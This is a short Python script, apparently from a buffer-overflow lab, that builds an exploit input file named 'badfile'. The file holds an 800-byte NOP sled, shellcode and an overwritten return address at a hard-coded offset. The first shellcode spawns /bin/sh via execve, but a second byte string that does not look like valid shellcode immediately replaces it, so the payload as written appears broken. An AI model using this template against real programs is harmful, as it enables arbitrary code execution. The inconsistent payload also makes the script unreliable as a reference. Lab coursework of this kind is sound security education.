#!/usr/bin/python3
import sys
shellcode= (
	"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
	"\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
	"\xd2\x31\xc0\xb0\x0b\xcd\x80"
).encode('latin-1')

shellcode= (
   "\x3b\x14\x45\x15\x06\xa0\x1b\xb8\xf6\x35\x55\x6f\xfd"
).encode('latin-1')

# Fill the content with NOP’s
content = bytearray(0x90 for i in range(800))

##################################################################
# Put the shellcode somewhere in the payload
start = 800 - len(shellcode) # ✩ Need to change ✩
content[start:start + len(shellcode)] = shellcode
# Decide the return address value
# and put it somewhere in the payload
ret =  0xffffd5d8 + 0x300# ✩ Need to change ✩
offset = 374 + 4 # ✩ Need to change ✩
L = 4 # Use 4 for 32-bit address and 8 for 64-bit address
content[offset:offset + L] = (ret).to_bytes(L,byteorder='little')
content[offset + 4 : offset + L + 4] = (49).to_bytes(L,byteorder='little')
content[offset + 12 : offset + L + 12] = (1).to_bytes(L,byteorder='little')


##################################################################

# Write the content to a file
with open('badfile', 'wb') as f:
	f.write(content)
